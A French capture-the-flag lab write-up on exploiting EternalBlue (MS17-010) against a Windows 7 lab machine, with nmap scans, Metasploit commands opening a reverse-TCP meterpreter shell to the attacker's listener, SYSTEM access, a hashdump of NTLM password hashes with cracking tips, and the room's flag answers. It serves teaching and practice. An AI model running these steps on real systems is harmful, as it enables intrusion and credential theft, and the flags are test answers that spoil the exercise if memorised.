## Windows et Eternal Blue

Dans ce TP nous allons essayer d'exploiter une faille de sécurité liés au service de Partage de fichiers et d'imprimante Windows (SMB).<br/>
Cette vulnérabilité est connue sous le nom d'EternalBlue.<br/>
SMB (Server Message Block) est un protocole serveur-client réglant l’accès à des fichiers, à des répertoires complets et à d’autres ressources du réseau comme les imprimantes, les routeurs ou les interfaces partagées dans le réseau.


#### Eternal Blue :

Scanner la machine cible pour d'éventuelles vulenératibilité :
```
$ nmap -sS -Pn -A -p- ADRESSE_IP
```

```diff
Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-25 12:31 UTC
Nmap scan report for ip-10-10-55-20.eu-west-1.compute.internal (10.10.55.20)
Host is up (0.0075s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2021-09-25T12:33:33+00:00; -1s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 02:7C:99:5B:22:A7 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=9/25%OT=135%CT=1%CU=39928%PV=Y%DS=1%DC=D%G=Y%M=027C99%
OS:TM=614F175A%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=I%CI=I%II=
OS:I%SS=S%TS=7)OPS(O1=M2301NW8ST11%O2=M2301NW8ST11%O3=M2301NW8NNT11%O4=M230
OS:1NW8ST11%O5=M2301NW8ST11%O6=M2301ST11)WIN(W1=2000%W2=2000%W3=2000%W4=200
OS:0%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M2301NW8NNS%CC=N%Q=)T1(R=Y%
OS:DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=
OS:0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S
OS:=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R
OS:=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%
OS:RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h14m59s, deviation: 2h30m00s, median: -1s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:7c:99:5b:22:a7 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-25T07:33:28-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-25T12:33:28
|_  start_date: 2021-09-25T12:17:54

TRACEROUTE
HOP RTT     ADDRESS
1   7.52 ms ip-10-10-55-20.eu-west-1.compute.internal (10.10.55.20)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 167.27 seconds
```

Combien de ports sont ouverts avec un numéro de port inférieur à 1000 ?
```console
Réponse : 3
```

ℹ️ Les ports ouverts nous renseignent sur le type d'applications qui tournent.

https://www.upguard.com/blog/smb-port#:~:text=SMB%20is%20a%20network%20file,dialects%20that%20communicate%20over%20NetBIOS.

* A quoi cette machine est-elle vulnérable ?

Lister les vulnerabilités potentielles de ce type :
```
ls -al /usr/share/nmap/scripts | grep -e "smb"
```

Vulnerabilité à exploiter : <br/>
  https://en.wikipedia.org/wiki/EternalBlue

```console
Réponse : ms17-010
```

Vérifier le statut de la vulnérabilité sur la machine cible :<br/>
⚠️ Le port TCP 445 est aujourd’hui réservé pour établir la connexion et le transfert via TCP/SMB.
```console
$ nmap -sS -Pn -p 445 ADRESSE_IP --script smb-vuln-ms17-010.nse
```

```console
@@Host script results:@@
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
```

Comprendre la vulnérabilité pour préparer l'attaque : <br/>
* References : <br/>
       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ <br/>
       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx  <br/>
       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143  <br/>

---

#### Attaque exploit :

**Metasploit** est un projet en relation avec la sécurité des systèmes informatiques. Son but est de fournir des informations sur les vulnérabilités de systèmes informatiques, d'aider à la pénétration et au développement de signatures pour les systèmes de détection d'intrusion.

Prise en main de Metasploit :

```console
$ msfconsole
```
<p align="center">
  <img src="img/Screenshot_2021-09-25_at_14-59-26_Blue_01.png"/>
</p>

* Quelle est le nom de l'attaque à lancer ?
```
msf6 > search eternalblue
```

```
Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

```console
Réponse : exploit/windows/smb/ms17_010_eternalblue
```

Sélectionner l'attaque :
```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

* Afficher les options et définisser la valeur pour l'option nécessaire. Quel est le nom de cette propriété ?
```
msf6 > exploit(windows/smb/ms17_010_eternalblue) > show options
```

```
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.30.2.112     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

```console
Réponse : RHOSTS
```

Pour mettre à jour une propriété :
```
set _OPTION_ _VALUE_
```

:mushroom: Hint : Le host local doit être adapté à l'interface créée par le VPN.

Préparer le payload pour enclencher un reverse shell en tcp adapté à l'architecture de la machine cible :
```
set payload windows/x64/shell/reverse_tcp
```

Lancer l'attaque :rocket:
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

```
[*] Started reverse TCP handler on 10.8.237.162:4444
[*] 10.10.214.31:445 - Executing automatic check (disable AutoCheck to override)
[*] 10.10.214.31:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.214.31:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.214.31:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.214.31:445 - The target is vulnerable.
[*] 10.10.214.31:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.214.31:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.214.31:445      - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.214.31:445 - Connecting to target for exploitation.
[+] 10.10.214.31:445 - Connection established for exploitation.
[+] 10.10.214.31:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.214.31:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.214.31:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.214.31:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.214.31:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.214.31:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.214.31:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.214.31:445 - Sending all but last fragment of exploit packet
[*] 10.10.214.31:445 - Starting non-paged pool grooming
[+] 10.10.214.31:445 - Sending SMBv2 buffers
[+] 10.10.214.31:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.214.31:445 - Sending final SMBv2 buffers.
[*] 10.10.214.31:445 - Sending last fragment of exploit packet!
[*] 10.10.214.31:445 - Receiving response from exploit packet
[+] 10.10.214.31:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.214.31:445 - Sending egg to corrupted connection.
[*] 10.10.214.31:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.10.214.31
[*] Meterpreter session 1 opened (10.8.237.162:4444 -> 10.10.214.31:49199) at 2021-09-13 10:32:39 +0000
[+] 10.10.214.31:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.214.31:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.214.31:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

Félicitations, vous avez pénétré la machine cible :raised_hands:

Lancer un shell windows :
```console
meterpreter > shell
Process 2184 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

Ctrl-C pour sortir.

Revenir en background sur MSF et explorer les sessions en cours :
```
meterpreter > background (ou Ctrl-Z) 
[*] Backgrounding session 1...
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.8.237.162:4444 -> 10.10.214.31:49199 (10.10.214.31)
```

Retourner sur la session :
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions 1
```

Basculer à nouveau sur le shell et vérifier que l'attaque d'escalation a réussi :
```
meterpreter > shell
Process 2768 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

CTrl-C
```

Confirmer avec le meterpreter :

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Lister les processus qui tournent sur la machine cible :

```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 520   688   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 584   688   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 644   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 688   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 696   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 704   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 808   688   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 876   688   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 928   688   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 992   644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 1064  688   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1144  688   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1332  688   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1400  688   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1472  688   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1584  688   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1824  688   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1876  688   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2032  808   WmiPrvSE.exe
 2548  688   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
 2808  688   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2836  688   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 2872  688   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 2956  688   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
 
 ```
 
Migrer l'interpreteur vers le processus winlogon.exe pour plus de stabilité (utiliser la commande MIGRATE)

* Quel était le processus vérolé par l'interpreteur avant migration ? 

#### Post-exploit : Récupération de crédentiels en mémoire

Commencer par faire un dump des mots de passe.
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
 
Récupérer le hash de Jon et essayer de le reverser avec crakstation.com ou l'utilitaire John the Ripper sur Kali.

Récherche des fichiers flag plantés dans la machine cible, il y en a 3 :

* Can you C it?
```console
Réponse : flag{access_the_machine}
```

Hint : Commencer par le flag 3.
```console
Réponse : flag{sam_database_elevated_access}
```

Ce flag peut être trouvé dans un excellent emplacement pour piller. Généralement, les administrateurs y ont sauvegardé des choses assez intéressantes.
```console
Réponse : flag{admin_documents_can_be_valuable}
```
